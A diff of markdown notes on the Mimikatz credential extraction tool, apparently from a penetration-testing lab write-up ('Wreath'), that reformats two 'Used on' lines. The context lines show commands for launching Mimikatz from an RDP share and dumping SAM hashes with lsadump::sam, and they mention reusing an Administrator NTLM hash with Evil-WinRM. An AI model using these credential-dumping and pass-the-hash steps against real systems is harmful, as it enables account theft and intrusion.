@@ -10,7 +10,9 @@ Windows credential extraction tool used after administrator-level access to dump
 \\tsclient\share\mimikatz\x64\mimikatz.exe
 ```
 
-Used on: **Wreath** - launched from a shared RDP drive to avoid a separate upload step.
+Used on: **Wreath**
+
+launched from a shared RDP drive to avoid a separate upload step.
 
 ### Enable debug, elevate token, and dump SAM
 
@@ -21,7 +23,9 @@ log c:\windows\temp\mimikatz.log
 lsadump::sam
 ```
 
-Used on: **Wreath** - dumped local SAM hashes for Administrator and Thomas, then reused the Administrator NTLM hash with Evil-WinRM.
+Used on: **Wreath**
+
+dumped local SAM hashes for Administrator and Thomas, then reused the Administrator NTLM hash with Evil-WinRM.
 
 ## Related
 
